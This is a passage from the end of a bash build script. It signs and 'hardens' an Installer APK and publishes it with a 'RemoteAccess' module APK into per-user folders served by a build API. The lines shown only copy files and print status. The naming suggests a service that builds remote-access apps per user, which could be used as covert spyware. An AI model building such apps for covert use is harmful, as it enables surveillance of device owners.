        echo "  Installer APK: apk-output/Installer-release.apk"
        # Harden the Installer APK — use its own separate unique keystore
        KEYSTORE="$INST_KS_PATH"
        KEY_ALIAS="$INST_KS_ALIAS"
        STORE_PASS="$INST_KS_SPASS"
        KEY_PASS="$INST_KS_KPASS"
        harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
    else
        echo "  WARNING: installer release APK not produced."
    fi
else
    echo "  Skipping installer — main release APK missing."
fi

# ── 13. Per-user output directory (when invoked by /api/build/apk) ───────────
# Publish the two final hardened APKs under apk-output/<accessId>/ as
# Module.apk and Installer.apk so the backend can serve them per-user.
if [ -n "${BUILD_ACCESS_ID:-}" ]; then
    PER_USER_DIR="$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
    mkdir -p "$PER_USER_DIR"
    if [ -f "$ROOT_DIR/apk-output/RemoteAccess-release.apk" ]; then
        cp "$ROOT_DIR/apk-output/RemoteAccess-release.apk" "$PER_USER_DIR/Module.apk"
        echo "  Per-user Module:    $PER_USER_DIR/Module.apk"
    fi
    if [ -f "$ROOT_DIR/apk-output/Installer-release.apk" ]; then
        cp "$ROOT_DIR/apk-output/Installer-release.apk" "$PER_USER_DIR/Installer.apk"
        echo "  Per-user Installer: $PER_USER_DIR/Installer.apk"
    fi
fi

# ── Summary ────────────────────────────────────────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  BUILD COMPLETE"
ls -lh "$ROOT_DIR/apk-output/"*.apk 2>/dev/null | awk '{print "  "$9" ("$5")"}'
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
